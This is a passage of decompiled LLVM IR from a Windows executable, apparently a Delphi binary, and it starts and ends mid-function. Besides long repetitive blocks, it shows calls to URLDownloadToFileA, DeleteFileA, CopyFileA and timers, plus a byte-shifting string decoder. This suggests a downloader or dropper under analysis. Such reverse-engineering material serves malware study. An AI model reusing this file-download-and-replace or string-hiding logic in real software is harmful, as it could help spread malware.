  %1 = load i8, i8* %0, align 4, !insn.addr !1313
  %2 = load i32, i32* %eax, align 4
  %3 = trunc i32 %2 to i8, !insn.addr !1313
  %4 = add i8 %1, %3, !insn.addr !1313
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1313
  store i8 %4, i8* %5, align 1, !insn.addr !1313
  %6 = load i8, i8* %0, align 4, !insn.addr !1314
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1314
  %9 = add i8 %6, %8, !insn.addr !1314
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1314
  store i8 %9, i8* %10, align 1, !insn.addr !1314
  %11 = load i8, i8* %0, align 4, !insn.addr !1315
  %12 = load i32, i32* %eax, align 4
  %13 = trunc i32 %12 to i8, !insn.addr !1315
  %14 = add i8 %11, %13, !insn.addr !1315
  %15 = inttoptr i32 %12 to i8*, !insn.addr !1315
  store i8 %14, i8* %15, align 1, !insn.addr !1315
  %16 = load i8, i8* %0, align 4, !insn.addr !1316
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !1316
  %19 = add i8 %16, %18, !insn.addr !1316
  %20 = inttoptr i32 %17 to i8*, !insn.addr !1316
  store i8 %19, i8* %20, align 1, !insn.addr !1316
  %21 = load i8, i8* %0, align 4, !insn.addr !1317
  %22 = load i32, i32* %eax, align 4
  %23 = trunc i32 %22 to i8, !insn.addr !1317
  %24 = add i8 %21, %23, !insn.addr !1317
  %25 = inttoptr i32 %22 to i8*, !insn.addr !1317
  store i8 %24, i8* %25, align 1, !insn.addr !1317
  %26 = load i8, i8* %0, align 4, !insn.addr !1318
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !1318
  %29 = add i8 %26, %28, !insn.addr !1318
  %30 = inttoptr i32 %27 to i8*, !insn.addr !1318
  store i8 %29, i8* %30, align 1, !insn.addr !1318
  %31 = load i8, i8* %0, align 4, !insn.addr !1319
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !1319
  %34 = add i8 %31, %33, !insn.addr !1319
  %35 = inttoptr i32 %32 to i8*, !insn.addr !1319
  store i8 %34, i8* %35, align 1, !insn.addr !1319
  %36 = load i8, i8* %0, align 4, !insn.addr !1320
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !1320
  %39 = add i8 %36, %38, !insn.addr !1320
  %40 = inttoptr i32 %37 to i8*, !insn.addr !1320
  store i8 %39, i8* %40, align 1, !insn.addr !1320
  %41 = load i8, i8* %0, align 4, !insn.addr !1321
  %42 = load i32, i32* %eax, align 4
  %43 = trunc i32 %42 to i8, !insn.addr !1321
  %44 = add i8 %41, %43, !insn.addr !1321
  %45 = inttoptr i32 %42 to i8*, !insn.addr !1321
  store i8 %44, i8* %45, align 1, !insn.addr !1321
  %46 = load i8, i8* %0, align 4, !insn.addr !1322
  %47 = load i32, i32* %eax, align 4
  %48 = trunc i32 %47 to i8, !insn.addr !1322
  %49 = add i8 %46, %48, !insn.addr !1322
  %50 = inttoptr i32 %47 to i8*, !insn.addr !1322
  store i8 %49, i8* %50, align 1, !insn.addr !1322
  %51 = load i8, i8* %0, align 4, !insn.addr !1323
  %52 = load i32, i32* %eax, align 4
  %53 = trunc i32 %52 to i8, !insn.addr !1323
  %54 = add i8 %51, %53, !insn.addr !1323
  %55 = inttoptr i32 %52 to i8*, !insn.addr !1323
  store i8 %54, i8* %55, align 1, !insn.addr !1323
  %56 = load i8, i8* %0, align 4, !insn.addr !1324
  %57 = load i32, i32* %eax, align 4
  %58 = trunc i32 %57 to i8, !insn.addr !1324
  %59 = add i8 %56, %58, !insn.addr !1324
  %60 = inttoptr i32 %57 to i8*, !insn.addr !1324
  store i8 %59, i8* %60, align 1, !insn.addr !1324
  %61 = load i8, i8* %0, align 4, !insn.addr !1325
  %62 = load i32, i32* %eax, align 4
  %63 = trunc i32 %62 to i8, !insn.addr !1325
  %64 = add i8 %61, %63, !insn.addr !1325
  %65 = inttoptr i32 %62 to i8*, !insn.addr !1325
  store i8 %64, i8* %65, align 1, !insn.addr !1325
  %66 = load i8, i8* %0, align 4, !insn.addr !1326
  %67 = load i32, i32* %eax, align 4
  %68 = trunc i32 %67 to i8, !insn.addr !1326
  %69 = add i8 %66, %68, !insn.addr !1326
  %70 = inttoptr i32 %67 to i8*, !insn.addr !1326
  store i8 %69, i8* %70, align 1, !insn.addr !1326
  %71 = load i8, i8* %0, align 4, !insn.addr !1327
  %72 = load i32, i32* %eax, align 4
  %73 = trunc i32 %72 to i8, !insn.addr !1327
  %74 = add i8 %71, %73, !insn.addr !1327
  %75 = inttoptr i32 %72 to i8*, !insn.addr !1327
  store i8 %74, i8* %75, align 1, !insn.addr !1327
  %76 = load i8, i8* %0, align 4, !insn.addr !1328
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !1328
  %79 = add i8 %76, %78, !insn.addr !1328
  %80 = inttoptr i32 %77 to i8*, !insn.addr !1328
  store i8 %79, i8* %80, align 1, !insn.addr !1328
  %81 = load i8, i8* %0, align 4, !insn.addr !1329
  %82 = load i32, i32* %eax, align 4
  %83 = trunc i32 %82 to i8, !insn.addr !1329
  %84 = add i8 %81, %83, !insn.addr !1329
  %85 = inttoptr i32 %82 to i8*, !insn.addr !1329
  store i8 %84, i8* %85, align 1, !insn.addr !1329
  %86 = load i8, i8* %0, align 4, !insn.addr !1330
  %87 = load i32, i32* %eax, align 4
  %88 = trunc i32 %87 to i8, !insn.addr !1330
  %89 = add i8 %86, %88, !insn.addr !1330
  %90 = inttoptr i32 %87 to i8*, !insn.addr !1330
  store i8 %89, i8* %90, align 1, !insn.addr !1330
  %91 = load i8, i8* %0, align 4, !insn.addr !1331
  %92 = load i32, i32* %eax, align 4
  %93 = trunc i32 %92 to i8, !insn.addr !1331
  %94 = add i8 %91, %93, !insn.addr !1331
  %95 = inttoptr i32 %92 to i8*, !insn.addr !1331
  store i8 %94, i8* %95, align 1, !insn.addr !1331
  %96 = load i8, i8* %0, align 4, !insn.addr !1332
  %97 = load i32, i32* %eax, align 4
  %98 = trunc i32 %97 to i8, !insn.addr !1332
  %99 = add i8 %96, %98, !insn.addr !1332
  %100 = inttoptr i32 %97 to i8*, !insn.addr !1332
  store i8 %99, i8* %100, align 1, !insn.addr !1332
  %101 = load i8, i8* %0, align 4, !insn.addr !1333
  %102 = load i32, i32* %eax, align 4
  %103 = trunc i32 %102 to i8, !insn.addr !1333
  %104 = add i8 %101, %103, !insn.addr !1333
  %105 = inttoptr i32 %102 to i8*, !insn.addr !1333
  store i8 %104, i8* %105, align 1, !insn.addr !1333
  %106 = load i8, i8* %0, align 4, !insn.addr !1334
  %107 = load i32, i32* %eax, align 4
  %108 = trunc i32 %107 to i8, !insn.addr !1334
  %109 = add i8 %106, %108, !insn.addr !1334
  %110 = inttoptr i32 %107 to i8*, !insn.addr !1334
  store i8 %109, i8* %110, align 1, !insn.addr !1334
  %111 = load i8, i8* %0, align 4, !insn.addr !1335
  %112 = load i32, i32* %eax, align 4
  %113 = trunc i32 %112 to i8, !insn.addr !1335
  %114 = add i8 %111, %113, !insn.addr !1335
  %115 = inttoptr i32 %112 to i8*, !insn.addr !1335
  store i8 %114, i8* %115, align 1, !insn.addr !1335
  %116 = load i8, i8* %0, align 4, !insn.addr !1336
  %117 = load i32, i32* %eax, align 4
  %118 = trunc i32 %117 to i8, !insn.addr !1336
  %119 = add i8 %116, %118, !insn.addr !1336
  %120 = inttoptr i32 %117 to i8*, !insn.addr !1336
  store i8 %119, i8* %120, align 1, !insn.addr !1336
  %121 = load i8, i8* %0, align 4, !insn.addr !1337
  %122 = load i32, i32* %eax, align 4
  %123 = trunc i32 %122 to i8, !insn.addr !1337
  %124 = add i8 %121, %123, !insn.addr !1337
  %125 = inttoptr i32 %122 to i8*, !insn.addr !1337
  store i8 %124, i8* %125, align 1, !insn.addr !1337
  %126 = load i8, i8* %0, align 4, !insn.addr !1338
  %127 = load i32, i32* %eax, align 4
  %128 = trunc i32 %127 to i8, !insn.addr !1338
  %129 = add i8 %126, %128, !insn.addr !1338
  %130 = inttoptr i32 %127 to i8*, !insn.addr !1338
  store i8 %129, i8* %130, align 1, !insn.addr !1338
  %131 = load i8, i8* %0, align 4, !insn.addr !1339
  %132 = load i32, i32* %eax, align 4
  %133 = trunc i32 %132 to i8, !insn.addr !1339
  %134 = add i8 %131, %133, !insn.addr !1339
  %135 = inttoptr i32 %132 to i8*, !insn.addr !1339
  store i8 %134, i8* %135, align 1, !insn.addr !1339
  %136 = load i8, i8* %0, align 4, !insn.addr !1340
  %137 = load i32, i32* %eax, align 4
  %138 = trunc i32 %137 to i8, !insn.addr !1340
  %139 = add i8 %136, %138, !insn.addr !1340
  %140 = inttoptr i32 %137 to i8*, !insn.addr !1340
  store i8 %139, i8* %140, align 1, !insn.addr !1340
  %141 = load i8, i8* %0, align 4, !insn.addr !1341
  %142 = load i32, i32* %eax, align 4
  %143 = trunc i32 %142 to i8, !insn.addr !1341
  %144 = add i8 %141, %143, !insn.addr !1341
  %145 = inttoptr i32 %142 to i8*, !insn.addr !1341
  store i8 %144, i8* %145, align 1, !insn.addr !1341
  %146 = load i8, i8* %0, align 4, !insn.addr !1342
  %147 = load i32, i32* %eax, align 4
  %148 = trunc i32 %147 to i8, !insn.addr !1342
  %149 = add i8 %146, %148, !insn.addr !1342
  %150 = inttoptr i32 %147 to i8*, !insn.addr !1342
  store i8 %149, i8* %150, align 1, !insn.addr !1342
  %151 = load i8, i8* %0, align 4, !insn.addr !1343
  %152 = load i32, i32* %eax, align 4
  %153 = trunc i32 %152 to i8, !insn.addr !1343
  %154 = add i8 %151, %153, !insn.addr !1343
  %155 = inttoptr i32 %152 to i8*, !insn.addr !1343
  store i8 %154, i8* %155, align 1, !insn.addr !1343
  %156 = load i8, i8* %0, align 4, !insn.addr !1344
  %157 = load i32, i32* %eax, align 4
  %158 = trunc i32 %157 to i8, !insn.addr !1344
  %159 = add i8 %156, %158, !insn.addr !1344
  %160 = inttoptr i32 %157 to i8*, !insn.addr !1344
  store i8 %159, i8* %160, align 1, !insn.addr !1344
  %161 = load i8, i8* %0, align 4, !insn.addr !1345
  %162 = load i32, i32* %eax, align 4
  %163 = trunc i32 %162 to i8, !insn.addr !1345
  %164 = add i8 %161, %163, !insn.addr !1345
  %165 = inttoptr i32 %162 to i8*, !insn.addr !1345
  store i8 %164, i8* %165, align 1, !insn.addr !1345
  %166 = load i8, i8* %0, align 4, !insn.addr !1346
  %167 = load i32, i32* %eax, align 4
  %168 = trunc i32 %167 to i8, !insn.addr !1346
  %169 = add i8 %166, %168, !insn.addr !1346
  %170 = inttoptr i32 %167 to i8*, !insn.addr !1346
  store i8 %169, i8* %170, align 1, !insn.addr !1346
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1347
  %171 = call i32 @__readfsdword(i32 0), !insn.addr !1348
  store i32 %171, i32* %stack_var_-48, align 4, !insn.addr !1348
  %172 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1348
  call void @__writefsdword(i32 0, i32 %172), !insn.addr !1349
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1350
  %173 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1350
  %174 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1351
  %175 = icmp eq i32 %174, 32770, !insn.addr !1352
  %176 = icmp eq i1 %175, false, !insn.addr !1353
  store i32 %173, i32* %esp.0.reg2mem, !insn.addr !1353
  br i1 %176, label %dec_label_pc_40648c, label %dec_label_pc_4063e0, !insn.addr !1353

dec_label_pc_4063e0:                              ; preds = %dec_label_pc_406364
  %177 = call i32 @function_407578(), !insn.addr !1354
  %178 = call i32 @"@LStrPos"(), !insn.addr !1355
  %179 = call i32 @"@LStrPos"(), !insn.addr !1356
  %180 = add i32 %179, -1, !insn.addr !1357
  %181 = icmp slt i32 %180, 0, !insn.addr !1358
  %182 = add i32 %178, 2, !insn.addr !1359
  %183 = icmp sgt i32 %182, %180, !insn.addr !1360
  %or.cond = or i1 %181, %183
  store i32 %173, i32* %esp.0.reg2mem, !insn.addr !1361
  br i1 %or.cond, label %dec_label_pc_40648c, label %dec_label_pc_406414, !insn.addr !1361

dec_label_pc_406414:                              ; preds = %dec_label_pc_4063e0
  %184 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1362
  store i32 %184, i32* %stack_var_-60, align 4, !insn.addr !1362
  %185 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1362
  %186 = call i32 @"@LStrCopy"(), !insn.addr !1363
  %187 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1364
  %188 = icmp eq i32 %187, 0, !insn.addr !1364
  store i32 %185, i32* %esp.0.reg2mem, !insn.addr !1365
  br i1 %188, label %dec_label_pc_40648c, label %dec_label_pc_40643c, !insn.addr !1365

dec_label_pc_40643c:                              ; preds = %dec_label_pc_406414
  %189 = call i32 @function_407360(), !insn.addr !1366
  %190 = call i32 @"@LStrFromPChar"(), !insn.addr !1367
  %191 = call i32 @"@LStrCat"(), !insn.addr !1368
  %192 = call i32 @function_4036f4(), !insn.addr !1369
  %193 = inttoptr i32 %192 to i8*, !insn.addr !1370
  %194 = call i1 @DeleteFileA(i8* %193), !insn.addr !1371
  %195 = call i32 @function_4036f4(), !insn.addr !1372
  %196 = inttoptr i32 %195 to i8*, !insn.addr !1373
  store i8* %196, i8** %stack_var_-76, align 4, !insn.addr !1373
  %197 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1373
  %198 = call i1 @CopyFileA(i8* %196, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1374
  %199 = call i32 @function_4060c8(), !insn.addr !1375
  store i32 %197, i32* %esp.0.reg2mem, !insn.addr !1375
  br label %dec_label_pc_40648c, !insn.addr !1375

dec_label_pc_40648c:                              ; preds = %dec_label_pc_40643c, %dec_label_pc_406414, %dec_label_pc_4063e0, %dec_label_pc_406364
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %200 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1376
  %201 = load i32, i32* %200, align 4, !insn.addr !1376
  call void @__writefsdword(i32 0, i32 %201), !insn.addr !1377
  %202 = add i32 %esp.0.reload, 8, !insn.addr !1378
  %203 = inttoptr i32 %202 to i32*, !insn.addr !1378
  store i32 4220078, i32* %203, align 4, !insn.addr !1378
  %204 = call i32 @"@LStrArrayClr"(), !insn.addr !1379
  ret i32 %204, !insn.addr !1380
}

define i32 @function_4064a7() local_unnamed_addr {
dec_label_pc_4064a7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1381
  ret i32 %0, !insn.addr !1381
}

define i32 @function_4064ac() local_unnamed_addr {
dec_label_pc_4064ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1382
}

define i32 @function_4064ae(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4064ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1383
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1383
  %3 = load i32, i32* %2, align 4, !insn.addr !1383
  ret i32 %3, !insn.addr !1384
}

define i32 @function_4064bf() local_unnamed_addr {
dec_label_pc_4064bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1385
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1385
  store i32 %1, i32* %2, align 4, !insn.addr !1385
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1386
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1386
  %7 = add i8 %4, %6, !insn.addr !1386
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1386
  store i8 %7, i8* %8, align 1, !insn.addr !1386
  %9 = load i32, i32* %eax, align 4, !insn.addr !1387
  ret i32 %9, !insn.addr !1387
}

define i32 @function_4064ce() local_unnamed_addr {
dec_label_pc_4064ce:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1388
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1388
  store i8 %4, i8* %5, align 1, !insn.addr !1388
  %6 = mul i32 %0, 4096, !insn.addr !1389
  %7 = udiv i32 %0, 1048576, !insn.addr !1389
  %8 = or i32 %7, %6, !insn.addr !1389
  %9 = and i32 %0, 1048576, !insn.addr !1389
  %10 = icmp eq i32 %9, 0, !insn.addr !1389
  %11 = load i32, i32* %edx, align 4, !insn.addr !1390
  %12 = trunc i32 %11 to i16, !insn.addr !1390
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1390
  %14 = sext i8 %13 to i32, !insn.addr !1390
  %15 = or i32 %2, %14, !insn.addr !1390
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1391
  %17 = and i32 %15, -256, !insn.addr !1391
  %18 = or i32 %17, %16, !insn.addr !1391
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1392
  %20 = load i8, i8* %19, align 1, !insn.addr !1392
  %21 = mul i8 %20, 2, !insn.addr !1392
  %22 = lshr i8 %20, 7, !insn.addr !1392
  %23 = or i8 %22, %21, !insn.addr !1392
  store i8 %23, i8* %19, align 1, !insn.addr !1392
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1393
  %26 = udiv i32 %1, 256, !insn.addr !1393
  %27 = trunc i32 %26 to i8, !insn.addr !1393
  %28 = add i8 %25, %27, !insn.addr !1393
  %29 = load i32, i32* %edx, align 4, !insn.addr !1393
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1393
  store i8 %28, i8* %30, align 1, !insn.addr !1393
  %31 = add i32 %8, -4, !insn.addr !1394
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1394
  store i32 4219816, i32* %32, align 4, !insn.addr !1394
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1395
  %34 = sext i1 %33 to i32, !insn.addr !1395
  ret i32 %34, !insn.addr !1396
}

define i32 @function_4064d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_4064e8() local_unnamed_addr {
dec_label_pc_4064e8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1397
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1397
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1397
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1398
  %2 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1399
  %3 = add i32 %2, 1, !insn.addr !1399
  store i32 %3, i32* @global_var_4096d4, align 4, !insn.addr !1399
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1400
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1401
  ret i32 0, !insn.addr !1402
}

define i32 @function_40650d() local_unnamed_addr {
dec_label_pc_40650d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1403
  ret i32 %0, !insn.addr !1403
}

define i32 @function_406512() local_unnamed_addr {
dec_label_pc_406512:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1404
}

define i32 @function_406514(i32 %arg1) local_unnamed_addr {
dec_label_pc_406514:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1405
}

define i32 @function_406518() local_unnamed_addr {
dec_label_pc_406518:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1406
  %2 = add i32 %1, -1, !insn.addr !1406
  store i32 %2, i32* @global_var_4096d4, align 4, !insn.addr !1406
  ret i32 %0, !insn.addr !1407
}

define i32 @function_406520() local_unnamed_addr {
dec_label_pc_406520:
  %eax.0.reg2mem = alloca i32, !insn.addr !1408
  %0 = call i32 @function_406594(), !insn.addr !1409
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1410
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1411
  br i1 %2, label %dec_label_pc_406554, label %dec_label_pc_406532, !insn.addr !1411

dec_label_pc_406532:                              ; preds = %dec_label_pc_406520
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1412
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1413
  %5 = load i32, i32* %4, align 4, !insn.addr !1413
  %6 = icmp eq i32 %5, 0, !insn.addr !1413
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1414
  br i1 %6, label %dec_label_pc_406554, label %dec_label_pc_40653c, !insn.addr !1414

dec_label_pc_40653c:                              ; preds = %dec_label_pc_406532
  call void @PostQuitMessage(i32 66), !insn.addr !1415
  %7 = call i32 @function_404400(i32 66), !insn.addr !1416
  unreachable, !insn.addr !1416

dec_label_pc_406554:                              ; preds = %dec_label_pc_406532, %dec_label_pc_406520
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1417
}

define i32 @function_406564() local_unnamed_addr {
dec_label_pc_406564:
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1418
  %1 = icmp eq i32 %0, 0, !insn.addr !1418
  br i1 %1, label %dec_label_pc_406572, label %dec_label_pc_40656d, !insn.addr !1419

dec_label_pc_40656d:                              ; preds = %dec_label_pc_406564
  %2 = call i32 @function_406594(), !insn.addr !1420
  br label %dec_label_pc_406572, !insn.addr !1420

dec_label_pc_406572:                              ; preds = %dec_label_pc_40656d, %dec_label_pc_406564
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1421
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1422
  %5 = load i32, i32* %4, align 4, !insn.addr !1422
  %6 = mul i32 %5, 1000, !insn.addr !1422
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4220192 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1423
  store i32 %7, i32* @global_var_408110, align 4, !insn.addr !1424
  ret i32 %7, !insn.addr !1425
}

define i32 @function_406594() local_unnamed_addr {
dec_label_pc_406594:
  %.reg2mem = alloca i32, !insn.addr !1426
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1426
  %1 = icmp eq i32 %0, 0, !insn.addr !1426
  store i32 %0, i32* %.reg2mem, !insn.addr !1427
  br i1 %1, label %2, label %dec_label_pc_40659d, !insn.addr !1427

; <label>:2:                                      ; preds = %dec_label_pc_406594
  %3 = call i32 @function_4065b1(), !insn.addr !1427
  %.pre = load i32, i32* @global_var_408110, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1427
  br label %dec_label_pc_40659d, !insn.addr !1427

dec_label_pc_40659d:                              ; preds = %2, %dec_label_pc_406594
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1428
  ret i32 %.reload, !insn.addr !1429
}

define i32 @function_4065b1() local_unnamed_addr {
dec_label_pc_4065b1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1430
}

define i32 @function_4065b4() local_unnamed_addr {
dec_label_pc_4065b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_4064d8(i32 %0), !insn.addr !1431
  ret i32 %1, !insn.addr !1432
}

define i32 @function_4065c0() local_unnamed_addr {
dec_label_pc_4065c0:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1433
  %1 = icmp eq i32 %0, 0, !insn.addr !1433
  br i1 %1, label %dec_label_pc_4065ce, label %dec_label_pc_4065c9, !insn.addr !1434

dec_label_pc_4065c9:                              ; preds = %dec_label_pc_4065c0
  %2 = call i32 @function_4065e8(), !insn.addr !1435
  br label %dec_label_pc_4065ce, !insn.addr !1435

dec_label_pc_4065ce:                              ; preds = %dec_label_pc_4065c9, %dec_label_pc_4065c0
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4220340 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1436
  store i32 %3, i32* @global_var_408114, align 4, !insn.addr !1437
  ret i32 %3, !insn.addr !1438
}

define i32 @function_4065e8() local_unnamed_addr {
dec_label_pc_4065e8:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1439
  ret i32 %0, !insn.addr !1440
}

define i32 @function_406608() local_unnamed_addr {
dec_label_pc_406608:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1441
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1441
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1441
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1442
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1443
  %3 = add i32 %2, 1, !insn.addr !1443
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1443
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1444
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1445
  ret i32 0, !insn.addr !1446
}

define i32 @function_40662d() local_unnamed_addr {
dec_label_pc_40662d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1447
  ret i32 %0, !insn.addr !1447
}

define i32 @function_406632() local_unnamed_addr {
dec_label_pc_406632:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1448
}

define i32 @function_406634(i32 %arg1) local_unnamed_addr {
dec_label_pc_406634:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1449
}

define i32 @function_406638() local_unnamed_addr {
dec_label_pc_406638:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1450
  %2 = add i32 %1, -1, !insn.addr !1450
  store i32 %2, i32* @global_var_4096d8, align 4, !insn.addr !1450
  ret i32 %0, !insn.addr !1451
}

define i32 @function_406640() local_unnamed_addr {
dec_label_pc_406640:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1452
  ret i32 %0, !insn.addr !1452
}

define i32 @function_406648() local_unnamed_addr {
dec_label_pc_406648:
  %esi.0.reg2mem = alloca i32, !insn.addr !1453
  %ebx.0.reg2mem = alloca i32, !insn.addr !1453
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1454
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1455
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1455
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1455
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1456
  %4 = call i32 @function_4034f4(), !insn.addr !1457
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1458
  %6 = call i32 @function_4034f4(), !insn.addr !1459
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1460
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1460
  br i1 %7, label %dec_label_pc_4066be, label %dec_label_pc_40668e, !insn.addr !1460

dec_label_pc_40668e:                              ; preds = %dec_label_pc_406648, %dec_label_pc_4066ba
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1461
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1461
  %11 = load i8, i8* %10, align 1, !insn.addr !1461
  %12 = icmp eq i8 %11, 61, !insn.addr !1461
  %13 = icmp eq i1 %12, false, !insn.addr !1462
  %14 = call i32 @function_40374c()
  br i1 %13, label %dec_label_pc_4066a6, label %dec_label_pc_406698, !insn.addr !1462

dec_label_pc_406698:                              ; preds = %dec_label_pc_40668e
  %15 = add i32 %14, %8, !insn.addr !1463
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1463
  store i8 46, i8* %16, align 1, !insn.addr !1463
  br label %dec_label_pc_4066ba, !insn.addr !1464

dec_label_pc_4066a6:                              ; preds = %dec_label_pc_40668e
  %17 = load i8, i8* %10, align 1, !insn.addr !1465
  %18 = add i8 %17, -1, !insn.addr !1466
  %19 = add i32 %14, %8, !insn.addr !1467
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1467
  store i8 %18, i8* %20, align 1, !insn.addr !1467
  br label %dec_label_pc_4066ba, !insn.addr !1467

dec_label_pc_4066ba:                              ; preds = %dec_label_pc_4066a6, %dec_label_pc_406698
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1468
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1469
  %23 = icmp eq i32 %22, 0, !insn.addr !1469
  %24 = icmp eq i1 %23, false, !insn.addr !1470
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1470
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1470
  br i1 %24, label %dec_label_pc_40668e, label %dec_label_pc_4066be, !insn.addr !1470

dec_label_pc_4066be:                              ; preds = %dec_label_pc_4066ba, %dec_label_pc_406648
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1471
